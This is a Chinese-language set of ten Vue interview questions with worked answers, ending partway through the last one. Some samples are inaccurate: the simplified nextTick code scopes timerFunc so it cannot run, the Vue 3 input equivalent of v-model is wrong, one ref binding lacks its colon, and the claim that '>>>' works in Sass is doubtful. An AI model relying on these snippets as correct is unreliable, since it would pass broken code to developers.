---
title: Vue 基础面试题
description: Vue 基础核心概念，涵盖 Vue3 vs Vue2、双向绑定、组件通信等 10 道经典面试题
---

# Vue 基础面试题

> **📚 共 10 题 · 简单 30% · 中等 50% · 困难 20%**

---

### Q1: Vue 3 相比 Vue 2 有哪些重大改进？为什么官方推荐使用 Vue 3？

> **⭐ 简单 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**Vue 3 的核心改进：**

**1. Proxy 响应式系统：**

```js
// Vue 2: Object.defineProperty
// - 无法检测属性添加/删除
// - 无法检测数组索引和长度变化
// - 需要深度递归

// Vue 3: Proxy
const obj = new Proxy({ a: 1 }, {
  get(target, key, receiver) {
    track(target, key);
    return Reflect.get(target, key, receiver);
  },
  set(target, key, value, receiver) {
    const result = Reflect.set(target, key, value, receiver);
    trigger(target, key);
    return result;
  },
  deleteProperty(target, key) {
    const result = Reflect.deleteProperty(target, key);
    trigger(target, key);
    return result;
  }
});
```

**2. Composition API：**

```vue
<!-- Vue 2 Options API -->
<script>
export default {
  data() { return { count: 0 } },
  methods: { increment() { this.count++ } },
  mounted() { console.log('mounted') },
}
</script>

<!-- Vue 3 Composition API -->
<script setup>
import { ref, onMounted } from 'vue'

const count = ref(0)
const increment = () => count.value++

onMounted(() => console.log('mounted'))
</script>
```

**3. Fragment（多根节点）：**

```vue
<!-- Vue 2：必须有单一根节点 -->
<template>
  <div>
    <h1>Title</h1>
    <p>Content</p>
  </div>
</template>

<!-- Vue 3：支持多根节点 -->
<template>
  <h1>Title</h1>
  <p>Content</p>
</template>
```

**4. Teleport（传送门）：**

```vue
<template>
  <Teleport to="body">
    <div class="modal">Modal Content</div>
  </Teleport>
</template>
```

**5. 性能提升：**

| 指标 | Vue 2 | Vue 3 |
|------|-------|-------|
| 包大小 | ~30KB | ~10KB |
| 初次渲染 | 基准 | 快 40-50% |
| 更新渲染 | 基准 | 快 1.3-2 倍 |
| 内存占用 | 基准 | 减少 54% |

**6. TypeScript 支持：**

```ts
// Vue 2：需要额外的类型定义
// Vue 3：源码使用 TypeScript，开箱即用

import { defineComponent, ref } from 'vue'

export default defineComponent({
  props: {
    name: { type: String, required: true }
  },
  setup(props) {
    const count = ref(0)
    return { count }
  }
})
```

**7. 自定义渲染器：**

```js
// Vue 3 可以创建自定义渲染器
import { createRenderer } from '@vue/runtime-core'

const { render } = createRenderer({
  createElement: (type) => createMyElement(type),
  insert: (el, parent) => parent.appendChild(el),
  // ...
})
```

**8. Tree-shaking 优化：**

```js
// Vue 3 的 API 支持 tree-shaking
import { ref, reactive } from 'vue'
// 未使用的 API 会被打包工具移除

// Vue 2 的所有 API 都在 Vue 对象上，无法 tree-shake
```

**对比总结：**

| 特性 | Vue 2 | Vue 3 |
|------|-------|-------|
| 响应式 | Object.defineProperty | Proxy |
| API 风格 | Options | Options + Composition |
| 根节点 | 单根 | 多根 (Fragment) |
| TypeScript | 支持但需额外定义 | 原生支持 |
| 包大小 | ~30KB | ~10KB |
| 性能 | 基准 | 更快 |

**知识点：** `Vue 3` `Vue 2 对比` `Proxy` `Composition API`

:::

---

### Q2: Vue 的双向绑定原理是什么？v-model 是如何工作的？

> **⭐ 简单 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**Vue 2 双向绑定原理：**

使用 `Object.defineProperty` 实现数据劫持。

```js
function defineResponsiveProperty(obj, key, value) {
  let internalValue = value;
  const dep = new Dep();
  
  Object.defineProperty(obj, key, {
    get() {
      if (Dep.target) {
        dep.depend(); // 收集依赖
      }
      return internalValue;
    },
    set(newValue) {
      if (internalValue !== newValue) {
        internalValue = newValue;
        dep.notify(); // 通知更新
      }
    }
  });
}
```

**Vue 3 双向绑定原理：**

使用 `Proxy` 实现。

```js
function reactive(target) {
  const proxy = new Proxy(target, {
    get(target, key, receiver) {
      track(target, key); // 收集依赖
      return Reflect.get(target, key, receiver);
    },
    set(target, key, value, receiver) {
      const result = Reflect.set(target, key, value, receiver);
      trigger(target, key); // 触发更新
      return result;
    }
  });
  return proxy;
}
```

**v-model 的工作原理：**

`v-model` 是语法糖，本质是 `:value` + `@input` 的组合。

**基础表单元素：**

```vue
<!-- v-model 写法 -->
<input v-model="text" />

<!-- 等价于 -->
<input 
  :value="text" 
  @input="text = $event.target.value" 
/>

<!-- Vue 3 等价于 -->
<input 
  :value="text" 
  @update:value="text = $event" 
/>
```

**自定义组件：**

```vue
<!-- 父组件 -->
<ChildComponent v-model="parentData" />

<!-- 等价于 -->
<ChildComponent 
  :modelValue="parentData" 
  @update:modelValue="parentData = $event" 
/>

<!-- 子组件实现 -->
<script setup>
const props = defineProps(['modelValue'])
const emit = defineEmits(['update:modelValue'])

const updateValue = (e) => {
  emit('update:modelValue', e.target.value)
}
</script>

<template>
  <input :value="modelValue" @input="updateValue" />
</template>
```

**多个 v-model（Vue 3）：**

```vue
<!-- 使用具名修饰符 -->
<UserName 
  v-model:first-name="first" 
  v-model:last-name="last" 
/>

<!-- 等价于 -->
<UserName 
  :firstName="first" 
  @update:first-name="first = $event"
  :lastName="last" 
  @update:last-name="last = $event"
/>
```

**v-model 修饰符：**

```vue
<!-- .lazy: change 事件触发 -->
<input v-model.lazy="text" />

<!-- .number: 自动转数字 -->
<input v-model.number="age" />

<!-- .trim: 去除首尾空格 -->
<input v-model.trim="name" />
```

**知识点：** `双向绑定` `v-model` `数据劫持` `Proxy`

:::

---

### Q3: computed 和 watch 有什么区别？分别在什么场景使用？

> **⭐ 简单 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**computed（计算属性）：**

```vue
<script setup>
import { ref, computed } from 'vue'

const price = ref(100)
const quantity = ref(2)

// 缓存计算结果
const total = computed(() => {
  console.log('计算中...')
  return price.value * quantity.value
})

// 可写计算属性
const double = computed({
  get: () => price.value * 2,
  set: (val) => { price.value = val / 2 }
})
</script>
```

**特点：**
- 有缓存（依赖不变时不重新计算）
- 必须返回一个值
- 支持 getter/setter
- 惰性求值（只有访问时才计算）

**watch（侦听器）：**

```vue
<script setup>
import { ref, watch } from 'vue'

const name = ref('John')

// 基础用法
watch(name, (newVal, oldVal) => {
  console.log(`name 从 ${oldVal} 变为 ${newVal}`)
})

// 多个数据源
const age = ref(20)
watch([name, age], ([newName, newAge], [oldName, oldAge]) => {
  console.log('name 或 age 变化了')
})

// 深度监听
const user = ref({ name: 'John', profile: { age: 20 } })
watch(user, (val) => {
  console.log('user 整体变化')
}, { deep: true })

// 深度监听单个属性
watch(() => user.value.profile, (val) => {
  console.log('profile 变化')
}, { deep: true })

// 立即执行
watch(name, (val) => {
  console.log('初始化时也会执行:', val)
}, { immediate: true })

// 回调清理
watch(dataSource, async (newId, oldId, onCleanup) => {
  const controller = new AbortController()
  onCleanup(() => controller.abort())
  
  const result = await fetch(`/api/data/${newId}`, {
    signal: controller.signal
  })
})
</script>
```

**特点：**
- 无缓存
- 支持副作用操作（如 API 请求）
- 可选择深度监听
- 不返回值

**对比表格：**

| 特性 | computed | watch |
|------|----------|-------|
| 缓存 | ✅ 有 | ❌ 无 |
| 异步 | ❌ 不支持 | ✅ 支持 |
| 副作用 | ❌ 不支持 | ✅ 支持 |
| 立即执行 | ❌ 无（默认） | ✅ 有 immediate |
| 返回值 | ✅ 必须返回 | ❌ 无返回值 |
| 深度监听 | ❌ 不支持 | ✅ 支持 |

**使用场景：**

**使用 computed：**

```vue
<!-- 派生状态 -->
<script setup>
const items = ref([])
const filteredItems = computed(() => items.value.filter(i => i.active))

// 格式化显示
const price = ref(100)
const displayPrice = computed(() => `¥${price.value.toFixed(2)}`)

// 多属性组合
const firstName = ref('')
const lastName = ref('')
const fullName = computed(() => `${firstName.value} ${lastName.value}`)
</script>
```

**使用 watch：**

```vue
<!-- 副作用操作 -->
<script setup>
const userId = ref(1)

// API 请求
watch(userId, async (id) => {
  const res = await fetch(`/api/user/${id}`)
  userData.value = await res.json()
}, { immediate: true })

// 路由变化
watch(() => route.params.id, (newId) => {
  analytics.track('page_view', { id: newId })
})

// 本地存储
watch(data, (val) => {
  localStorage.setItem('data', JSON.stringify(val))
}, { deep: true })
</script>
```

**选择指南：**

| 场景 | 选择 |
|------|------|
| 派生计算 | computed |
| 格式化显示 | computed |
| 条件过滤 | computed |
| API 请求 | watch |
| DOM 操作 | watch |
| 本地存储 | watch |
| 事件追踪 | watch |

**知识点：** `computed` `watch` `响应式`

:::

---

### Q4: v-if 和 v-show 有什么区别？它们分别适用于什么场景？

> **⭐ 简单 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**v-if（条件渲染）：**

```vue
<!-- v-if 是真正的条件渲染 -->
<template v-if="isVisible">
  <div>内容</div>
</template>

<!-- v-if 的实现原理 -->
<!-- 条件为 false 时，元素根本不存在于 DOM 中 -->
<!-- 条件切换时，会创建/销毁 DOM 和组件实例 -->
```

**v-show（条件显示）：**

```vue
<!-- v-show 始终渲染，通过 CSS 显示/隐藏 -->
<div v-show="isVisible">内容</div>

<!-- v-show 的实现原理 -->
<!-- 等价于：:style="{ display: isVisible ? '' : 'none' }" -->
<!-- 元素始终存在于 DOM 中 -->
```

**对比表格：**

| 特性 | v-if | v-show |
|------|------|--------|
| DOM 操作 | 创建/销毁 | 始终存在 |
| 性能消耗 | 切换时高 | 切换时低 |
| 初始渲染 | 慢（如果条件为 false） | 快（始终渲染） |
| CSS 过渡 | ✅ 支持 | ✅ 支持 |
| v-else | ✅ 支持 | ❌ 不支持 |
| v-else-if | ✅ 支持 | ❌ 不支持 |
| template 支持 | ✅ 支持 | ❌ 不支持 |

**v-if 的工作原理：**

```vue
<!-- Vue 编译后 -->
<!-- v-if -->
{
  if: condition,
  block: () => [createVNode('div', null, '内容')]
}

<!-- v-show -->
{
  show: condition,
  children: createVNode('div', null, '内容')
}
```

**使用场景：**

**使用 v-if：**

```vue
<!-- 1. 不常切换的场景 -->
<div v-if="user.isAdmin">
  <AdminPanel />
</div>

<!-- 2. 需要性能优化（初始条件为 false） -->
<div v-if="heavyDataLoaded">
  <HeavyComponent :data="heavyData" />
</div>

<!-- 3. 需要 v-else -->
<div v-if="isLoggedIn">欢迎回来</div>
<div v-else>请登录</div>

<!-- 4. 配合 v-for（注意性能） -->
<li v-for="item in items" :key="item.id" v-if="item.visible">
  {{ item.name }}
</li>
```

**使用 v-show：**

```vue
<!-- 1. 频繁切换的场景 -->
<button @click="toggle">切换</button>
<div v-show="isOpen">弹出内容</div>

<!-- 2. 需要保持状态的场景 -->
<!-- v-show 会保持组件状态，v-if 会销毁 -->
<TodoList v-show="activeTab === 'todo'" />
<DoneList v-show="activeTab === 'done'" />

<!-- 3. 有复杂初始化的组件 -->
<ExpensiveComponent v-show="isVisible" />
```

**性能对比示例：**

```vue
<script setup>
import { ref } from 'vue'

const visible = ref(true)

// v-if: 每次切换都触发重新渲染和创建/销毁
const vIfCount = ref(0)
const vIfRender = () => {
  vIfCount.value++
  console.log('v-if 渲染次数:', vIfCount.value)
}

// v-show: 只在初始时渲染一次
const vShowCount = ref(0)
const vShowRender = () => {
  vShowCount.value++
  console.log('v-show 渲染次数:', vShowCount.value)
}
</script>

<template>
  <div v-if="visible" @vue:mounted="vIfRender">v-if</div>
  <div v-show="visible" @vue:mounted="vShowRender">v-show</div>
</template>
```

**官方建议：**

> `v-if` 有更高的切换开销，而 `v-show` 有更高的初始渲染开销。
> 因此，如果需要频繁切换，使用 `v-show` 较好；
> 如果在运行时条件很少改变，使用 `v-if` 较好。

**知识点：** `v-if` `v-show` `条件渲染`

:::

---

### Q5: Vue 组件间通信有哪些方式？请详细说明每种方式的优缺点

> **🔥 中等 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**1. Props / $emit（父子组件）：**

```vue
<!-- 父组件 -->
<template>
  <Child 
    :message="parentMessage" 
    @update="handleUpdate" 
  />
</template>

<script setup>
import { ref } from 'vue'
const parentMessage = ref('Hello')
const handleUpdate = (val) => console.log(val)
</script>

<!-- 子组件 -->
<script setup>
const props = defineProps(['message'])
const emit = defineEmits(['update'])

const sendToParent = () => {
  emit('update', 'Message from child')
}
</script>
```

| 优点 | 缺点 |
|------|------|
| 清晰的数据流向 | 只能父子通信 |
| 类型安全 | 多层传递繁琐 |
| 官方推荐 | 事件命名易出错 |

**2. provide / inject（跨层级）：**

```vue
<!-- 祖先组件 -->
<script setup>
import { provide, ref } from 'vue'
const theme = ref('dark')
provide('theme', theme)
provide('updateTheme', (val) => theme.value = val)
</script>

<!-- 后代组件 -->
<script setup>
import { inject } from 'vue'
const theme = inject('theme')
const updateTheme = inject('updateTheme')
</script>
```

| 优点 | 缺点 |
|------|------|
| 跨层级通信 | 数据流向不清晰 |
| 避免 prop drilling | 难以追踪数据来源 |
| 适合共享配置 | 不推荐用于应用级状态 |

**3. Vuex / Pinia（全局状态）：**

```vue
<!-- Pinia store -->
<script setup>
import { useUserStore } from '@/stores/user'

const userStore = useUserStore()
const userName = computed(() => userStore.name)

const logout = () => {
  userStore.logout()
}
</script>
```

| 优点 | 缺点 |
|------|------|
| 全局状态管理 | 增加复杂度 |
| DevTools 支持 | 需要学习成本 |
| 状态可追踪 | 小项目过度设计 |

**4. $attrs / $listeners（透传属性）：**

```vue
<!-- 父组件 -->
<GrandChild id="my-id" class="my-class" @click="handleClick" />

<!-- 中间组件（不需要声明 props） -->
<!-- Vue 3: $attrs 包含所有未声明的 props 和 listeners -->
<script setup>
// 自动透传
</script>
<template>
  <Child /> <!-- $attrs 自动传递 -->
</template>
```

| 优点 | 缺点 |
|------|------|
| 透传属性方便 | 难以理解数据流 |
| 减少样板代码 | 调试困难 |

**5. $refs（直接访问子组件）：**

```vue
<template>
  <Child ref="childRef" />
  <button @click="callChildMethod">调用子组件方法</button>
</template>

<script setup>
import { ref, onMounted } from 'vue'
const childRef = ref(null)

const callChildMethod = () => {
  childRef.value.childMethod()
}
</script>
```

| 优点 | 缺点 |
|------|------|
| 直接调用方法 | 破坏组件封装 |
| 直接访问实例 | 难以维护 |
| | 不推荐常规使用 |

**6. $parent / $children（访问父/子组件）：**

```vue
<script setup>
import { getCurrentInstance } from 'vue'

const { proxy, parent } = getCurrentInstance()
console.log(parent) // 父组件实例
</script>
```

| 优点 | 缺点 |
|------|------|
| 直接访问 | 紧耦合 |
| | 不推荐，Vue 3 中 $children 已移除 |

**7. mitt / EventBus（事件总线）：**

```js
// eventBus.js
import mitt from 'mitt'
export const emitter = mitt()

// 组件 A
emitter.emit('event', data)

// 组件 B
emitter.on('event', (data) => {
  console.log(data)
})
```

| 优点 | 缺点 |
|------|------|
| 任意组件通信 | 难以追踪 |
| 简单 | 事件命名冲突 |
| | 组件销毁需清理 |

**Vuex vs Pinia 对比：**

| 特性 | Vuex | Pinia |
|------|------|-------|
| 类型支持 | 一般 | 优秀 |
| DevTools | ✅ | ✅ |
| 模块化 | 需要配置 | 内置支持 |
| 体积 | 大 | 小（1KB） |
| 语法 | 复杂 | 简洁 |
| TypeScript | 需要额外配置 | 开箱即用 |

**选择指南：**

```
父子组件 → Props / $emit
跨层级 → provide / inject
全局状态 → Pinia (推荐) / Vuex
简单事件 → mitt (EventBus)
特殊情况 → $refs
```

**知识点：** `组件通信` `props` `emit` `provide` `Pinia`

:::

---

### Q6: key 在 Vue 中的作用是什么？为什么 v-for 中必须要用 key？

> **⭐ 简单 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**key 的作用：**

key 是 Vue 虚拟 DOM 的唯一标识，帮助 Diff 算法高效识别节点。

**没有 key 的问题：**

```vue
<!-- 没有 key -->
<div v-for="item in items">
  {{ item.name }}
</div>

<!-- 问题：Vue 使用"就地更新"策略 -->
<!-- 当 items 顺序变化时，Vue 不会移动 DOM 元素 -->
<!-- 而是更新每个位置的内容，导致： -->
<!-- 1. 组件状态错乱 -->
<!-- 2. 输入框内容保留 -->
<!-- 3. 性能浪费 -->
```

**有 key 的优化：**

```vue
<!-- 正确用法 -->
<div v-for="item in items" :key="item.id">
  {{ item.name }}
</div>

<!-- Vue 通过 key 识别节点 -->
<!-- key 相同时移动 DOM 而不是重建 -->
```

**Diff 算法工作流程：**

```
旧列表：[A:1, B:2, C:3, D:4]
新列表：[B:2, A:1, D:4, C:3]

有 key:
- 识别出 A:1 移动到位置 1
- 识别出 B:2 移动到位置 0
- 识别出 C:3 移动到位置 3
- 识别出 D:4 移动到位置 2
- 只需移动节点，不重建

没有 key:
- 逐个位置比较
- 位置 0: A→B (更新内容)
- 位置 1: B→A (更新内容)
- 位置 2: C→D (更新内容)
- 位置 3: D→C (更新内容)
- 内容都更新了，但实际上只是顺序变了
```

**key 的选择：**

```vue
<!-- ✅ 推荐：使用唯一 ID -->
<li v-for="item in items" :key="item.id" />

<!-- ✅ 也可以：无状态且顺序不变的列表 -->
<li v-for="(item, index) in items" :key="index" />

<!-- ❌ 不推荐：使用随机数 -->
<li v-for="item in items" :key="Math.random()" />
<!-- 每次渲染都会重建所有节点 -->

<!-- ❌ 不推荐：使用内容作为 key（如果内容可能重复） -->
<li v-for="item in items" :key="item.name" />
```

**保持组件状态：**

```vue
<template>
  <TodoList>
    <TodoItem 
      v-for="todo in todos" 
      :key="todo.id"
      :todo="todo"
    />
  </TodoList>
</template>

<script setup>
// 如果 todo 的输入框正在编辑
// 使用正确的 key 可以保持编辑状态
// 使用 index 作 key 会导致状态错乱
</script>
```

**强制重渲染：**

```vue
<script setup>
import { ref } from 'vue'

const count = ref(0)
const forceUpdate = () => count.value++
</script>

<template>
  <!-- 通过改变 key 强制子组件重新创建 -->
  <ChildComponent :key="count" />
</template>
```

**知识点：** `key` `Diff 算法` `v-for` `虚拟 DOM`

:::

---

### Q7: nextTick 的原理是什么？有哪些使用场景？

> **🔥 中等 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**nextTick 定义：**

等待 Vue 下次 DOM 更新循环完成后再执行回调。

**原理：**

```
数据变化
    ↓
异步队列（微任务）
    ↓
下一个 tick
    ↓
DOM 更新
    ↓
nextTick 回调执行
```

**微任务实现：**

```js
// Vue 3 nextTick 简化版
let pending = false
const callbacks = []

function flushCallbacks() {
  pending = false
  const copies = callbacks.slice(0)
  callbacks.length = 0
  copies.forEach(cb => cb())
}

// 使用优先级：Promise > MutationObserver > setTimeout
if (typeof Promise !== 'undefined') {
  const p = Promise.resolve()
  const timerFunc = () => p.then(flushCallbacks)
} else if (typeof MutationObserver !== 'undefined') {
  const observer = new MutationObserver(flushCallbacks)
  const textNode = document.createTextNode('1')
  observer.observe(textNode, { characterData: true })
  const timerFunc = () => textNode.data = '0'
} else {
  const timerFunc = () => setTimeout(flushCallbacks, 0)
}

export function nextTick(fn) {
  return new Promise(resolve => {
    callbacks.push(() => {
      if (fn) fn()
      resolve()
    })
    if (!pending) {
      pending = true
      timerFunc()
    }
  })
}
```

**使用场景：**

**场景 1：更新后访问 DOM**

```vue
<script setup>
import { ref, nextTick } from 'vue'

const message = ref('Hello')
const divRef = ref(null)

const updateMessage = async () => {
  message.value = 'New Message'
  
  // DOM 还未更新
  console.log(divRef.value.textContent) // 'Hello'
  
  // 等待 DOM 更新
  await nextTick()
  console.log(divRef.value.textContent) // 'New Message'
}
</script>

<template>
  <div ref="divRef">{{ message }}</div>
</template>
```

**场景 2：v-for 后聚焦**

```vue
<script setup>
import { ref, nextTick } from 'vue'

const items = ref([])
const inputRefs = ref([])

const addItem = async () => {
  items.value.push({ id: Date.now() })
  
  // 等待 DOM 更新后聚焦最后一个输入框
  await nextTick()
  const lastInput = inputRefs.value[inputRefs.value.length - 1]
  lastInput?.focus()
}
</script>

<template>
  <div v-for="(item, index) in items" :key="item.id">
    <input ref="(el) => (inputRefs[index] = el)" />
  </div>
  <button @click="addItem">Add</button>
</template>
```

**场景 3：配合第三方库**

```vue
<script setup>
import { ref, nextTick, onMounted } from 'vue'
import Chart from 'chart.js'

const chartContainer = ref(null)
const chart = ref(null)
const data = ref([])

const initChart = () => {
  chart.value = new Chart(chartContainer.value, { /* config */ })
}

const updateData = async () => {
  data.value = newData
  
  // 等待 DOM 更新
  await nextTick()
  
  // 更新图表
  chart.value.update()
}
</script>
```

**场景 4：复杂动画**

```vue
<script setup>
import { ref, nextTick } from 'vue'

const isExpanded = ref(false)
const contentRef = ref(null)

const toggle = async () => {
  isExpanded.value = !isExpanded.value
  
  await nextTick()
  
  if (isExpanded.value) {
    // 获取展开后的实际高度
    const height = contentRef.value.scrollHeight
    contentRef.value.style.height = '0px'
    requestAnimationFrame(() => {
      contentRef.value.style.height = height + 'px'
    })
  }
}
</script>
```

**Promise 和回调形式：**

```vue
<script setup>
import { nextTick } from 'vue'

// Promise 形式
async function update() {
  await nextTick()
  // DOM 已更新
}

// 回调形式
nextTick(() => {
  // DOM 已更新
})
</script>
```

**生命周期中的 nextTick：**

```vue
<script setup>
import { onMounted, nextTick } from 'vue'

onMounted(async () => {
  // onMounted 执行时 DOM 已更新
  // 但在某些情况下（如 v-for 动态渲染）可能需要额外等待
  await nextTick()
  // 确保所有异步渲染完成
})
</script>
```

**知识点：** `nextTick` `异步队列` `微任务`

:::

---

### Q8: scoped CSS 是如何工作的？如何实现样式穿透？

> **⭐ 简单 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**scoped CSS 原理：**

Vue 给每个组件的元素添加唯一的 `data-v-xxxxxx` 属性，选择器也会编译成带这个属性的形式。

```vue
<style scoped>
.example {
  color: red;
}
</style>

<!-- 编译后 -->
<style>
.example[data-v-12345] {
  color: red;
}
</style>

<div class="example" data-v-12345>内容</div>
```

**样式穿透方式：**

**方式 1: :deep() 选择器（推荐）：**

```vue
<style scoped>
.parent {
  :deep(.child) {
    color: red;
  }
}

/* 等同于 */
.parent .child[data-v-12345] {
  color: red;
}
</style>
```

**方式 2: ::v-deep 伪类（Vue 2 语法，已废弃）：**

```vue
<style scoped>
.parent::v-deep .child {
  color: red;
}
</style>
```

**方式 3: >>> 操作符（Sass/Less/Stylus）：**

```vue
<style scoped lang="scss">
.parent {
  >>> .child {
    color: red;
  }
  
  // 或
  ::v-deep .child {
    color: red;
  }
}
</style>
```

**方式 4: :slotted() 插槽内容：**

```vue
<style scoped>
.slot-wrapper {
  :slotted(.child) {
    color: red;
  }
}
</style>

<template>
  <div class="slot-wrapper">
    <slot />
  </div>
</template>

<!-- 父组件 -->
<ChildComponent>
  <span class="child">插槽内容</span>
</ChildComponent>
```

**方式 5: :global() 全局样式：**

```vue
<style scoped>
:global(.some-global-class) {
  color: red;
}
</style>
```

**常见场景：**

**场景 1：修改第三方组件样式：**

```vue
<style scoped>
.custom-select {
  :deep(.el-select__input) {
    border-color: #409eff;
  }
  
  :deep(.el-select__caret) {
    color: #409eff;
  }
}
</style>
```

**场景 2：子组件根元素样式：**

```vue
<!-- Child.vue -->
<template>
  <div class="child">
    <slot />
  </div>
</template>

<style scoped>
.child {
  padding: 10px;
}
</style>

<!-- Parent.vue -->
<style scoped>
.parent {
  :deep(.child) {
    background: #f0f0f0;
  }
}
</style>
```

**scoped 对比非 scoped：**

| 特性 | scoped | 非 scoped |
|------|--------|-----------|
| 作用域 | 仅当前组件 | 全局 |
| 类名污染 | ❌ 不会 | ✅ 会 |
| 修改子组件 | 需穿透 | 直接选择 |
| 第三方库集成 | 需 :deep() | 直接 |

**最佳实践：**

```vue
<!-- 推荐：默认使用 scoped -->
<style scoped>
.local-style {
  color: red;
}
</style>

<!-- 全局样式放单独的 CSS 文件 -->
<!-- styles/global.css -->
.global-button {
  /* 全局按钮样式 */
}

<!-- 需要穿透时使用 :deep() -->
<style scoped>
.container {
  :deep(.third-party-class) {
    /* 修改第三方组件 */
  }
}
</style>

<!-- 局部非 scoped -->
<style module>
.localClass {
  /* CSS Modules */
}
</style>
```

**知识点：** `scoped` `样式穿透` `:deep()` `局部样式`

:::

---

### Q9: Vue 的生命周期有哪些？Vue 2 和 Vue 3 的生命周期有什么区别？

> **🔥 中等 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**Vue 2 生命周期：**

```
beforeCreate → created → beforeMount → mounted → 
beforeUpdate → updated → beforeDestroy → destroyed
```

**Vue 3 生命周期：**

```
setup() → onBeforeMount → onMounted → 
onBeforeUpdate → onUpdated → onBeforeUnmount → onUnmounted
```

**Vue 3 Composition API 写法：**

```vue
<script setup>
import { 
  onBeforeMount, onMounted, 
  onBeforeUpdate, onUpdated, 
  onBeforeUnmount, onUnmounted,
  onErrorCaptured, onRenderTracked, onRenderTriggered 
} from 'vue'

// setup 替代 beforeCreate + created
console.log('setup')

onBeforeMount(() => {
  console.log('beforeMount')
})

onMounted(() => {
  console.log('mounted - DOM 已渲染')
})

onBeforeUpdate(() => {
  console.log('beforeUpdate - 数据更新前')
})

onUpdated(() => {
  console.log('updated - DOM 已更新')
})

onBeforeUnmount(() => {
  console.log('beforeUnmount')
})

onUnmounted(() => {
  console.log('unmounted - 已销毁')
})

// Vue 3 新增
onErrorCaptured((err, instance, info) => {
  console.log('错误捕获', err)
})

onRenderTracked(({ key, targetType }) => {
  console.log('渲染追踪', key)
})

onRenderTriggered(({ key, targetType }) => {
  console.log('渲染触发', key)
})
</script>
```

**Vue 2 Options API 写法：**

```vue
<script>
export default {
  beforeCreate() {
    console.log('beforeCreate')
  },
  created() {
    console.log('created - 数据观测完成')
  },
  beforeMount() {
    console.log('beforeMount')
  },
  mounted() {
    console.log('mounted - DOM 已渲染')
  },
  beforeUpdate() {
    console.log('beforeUpdate')
  },
  updated() {
    console.log('updated')
  },
  beforeDestroy() {
    console.log('beforeDestroy')
  },
  destroyed() {
    console.log('destroyed')
  }
}
</script>
```

**对比表格：**

| Vue 2 | Vue 3 | 位置说明 |
|-------|-------|----------|
| beforeCreate | setup() | 实例初始化后 |
| created | setup() | 数据观测完成 |
| beforeMount | onBeforeMount | 挂载前 |
| mounted | onMounted | 挂载完成 |
| beforeUpdate | onBeforeUpdate | 更新前 |
| updated | onUpdated | 更新完成 |
| beforeDestroy | onBeforeUnmount | 卸载前 |
| destroyed | onUnmounted | 卸载完成 |

**生命周期使用场景：**

```vue
<script setup>
import { ref, onMounted, onUnmounted } from 'vue'

// onMounted - DOM 操作、启动定时器
const divRef = ref(null)
onMounted(() => {
  divRef.value.focus()
  startTimer()
})

// onUnmounted - 清理副作用
onUnmounted(() => {
  clearInterval(timerRef.value)
  document.removeEventListener('click', handleClick)
  subscriptions.forEach(sub => sub.unsubscribe())
})

// onUpdated - DOM 更新后的操作
onUpdated(() => {
  scrollTop.value = containerRef.value.scrollTop
})

// 错误处理
import { onErrorCaptured } from 'vue'
onErrorCaptured((err, instance, info) => {
  console.error('捕获错误:', err)
  // 返回 false 阻止继续传播
  return false
})
</script>
```

**异步 setup：**

```vue
<script setup>
// 异步 setup 需要 Suspense 包裹
const data = await fetchData()
</script>
```

**知识点：** `生命周期` `Vue 2` `Vue 3` `Composition API`

:::

---

### Q10: 什么是 options API 和 composition API？它们的核心区别是什么？

> **⭐ 简单 · Vue**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**Options API（选项式 API）：**

Vue 2 的主要 API 风格，通过配置对象定义组件。

```vue
<script>
export default {
  // 数据
  data() {
    return {
      count: 0,
      user: null
    }
  },
  
  // 计算属性
  computed: {
    double() {
      return this.count * 2
    }
  },
  
  // 方法
  methods: {
    increment() {
      this.count++
    }
  },
  
  // 生命周期
  mounted() {
    console.log('mounted')
  },
  
  // 监听
  watch: {
    count(newVal) {
      console.log('count changed:', newVal)
    }
  },
  
  // 组件
  components: {
    ChildComponent
  }
}
</script>
```

**Composition API（组合式 API）：**

Vue 3 引入的新 API 风格，通过函数组合逻辑。

```vue
<script setup>
import { ref, computed, watch, onMounted } from 'vue'

// 数据
const count = ref(0)
const user = ref(null)

// 计算属性
const double = computed(() => count.value * 2)

// 方法
const increment = () => {
  count.value++
}

// 生命周期
onMounted(() => {
  console.log('mounted')
})

// 监听
watch(count, (newVal) => {
  console.log('count changed:', newVal)
})
</script>
```

**核心区别：**

| 特性 | Options API | Composition API |
|------|-------------|-----------------|
| 组织方式 | 按选项 | 按逻辑功能 |
| this | 需要使用 | 不需要 |
| 代码复用 | mixins / HOC | composables |
| TypeScript | 支持但复杂 | 原生支持 |
| 心智模型 | 固定结构 | 自由组织 |

**逻辑复用对比：**

**Options API - mixins：**

```js
// mixins/useCounter.js
export default {
  data() {
    return { count: 0 }
  },
  methods: {
    increment() { this.count++ }
  }
}

// 组件
export default {
  mixins: [useCounter],
  mounted() {
    console.log(this.count) // 来源不清晰
  }
}
```

**问题：** mixis 存在命名冲突、参数不清晰、依赖关系不明确

**Composition API - composables：**

```js
// composables/useCounter.js
import { ref } from 'vue'

export function useCounter(initialValue = 0) {
  const count = ref(initialValue)
  const increment = () => count.value++
  const decrement = () => count.value--
  
  return { count, increment, decrement }
}

// 组件
<script setup>
import { useCounter } from '@/composables/useCounter'

const { count, increment, decrement } = useCounter(0)
</script>
```

**优势：**
- 来源清晰
- 参数明确
- 类型友好
- 无命名冲突

**代码组织对比：**

**Options API - 按功能分散：**

```vue
<script>
export default {
  // 用户相关分散在各处
  data() {
    return {
      userName: '',
      userAge: 0,
    }
  },
  computed: {
    userDisplayName() { return `${this.userName}` }
  },
  methods: {
    fetchUser() { /* ... */ },
    updateUser() { /* ... */ }
  }
  
  // 文章相关也分散在各处
  // ...
}
</script>
```

**Composition API - 按逻辑组织：**

```vue
<script setup>
// 用户逻辑
const userName = ref('')
const userAge = ref(0)
const userDisplayName = computed(() => userName.value)
const fetchUser = async () => { /* ... */ }
const updateUser = async () => { /* ... */ }

// 文章逻辑
const articles = ref([])
const fetchArticles = async () => { /* ... */ }
</script>
```

**何时使用哪个：**

**使用 Options API：**

- Vue 2 项目
- 小型组件
- 团队对 Options API 熟悉

